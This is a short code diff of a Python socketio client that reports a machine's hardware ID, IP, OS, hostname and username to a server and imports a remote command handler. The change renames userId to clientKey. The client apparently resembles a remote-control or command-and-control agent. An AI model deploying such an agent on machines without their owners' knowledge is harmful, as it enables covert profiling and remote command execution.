@@ -1,5 +1,5 @@
 import socketio
-from auth import get_user_id
+from auth import get_client_key
 from command_handler import run_command
 from utils.system_info import get_hostname, get_hwid, get_ip, get_os, get_username
 from config import WEBSOCKET_URL 
@@ -44,8 +44,6 @@ def connect_to_server():
         
 
 def register_client():
-    user_id = get_user_id()
-
     client_info = {
         'hwid': get_hwid(),
         'ip': get_ip(),
@@ -53,7 +51,7 @@ def register_client():
         'hostname': get_hostname(),
         'username': get_username(),
         'online': True,
-        'userId': user_id
+        'clientKey': get_client_key()
     }
     sio.emit("register", client_info)
 
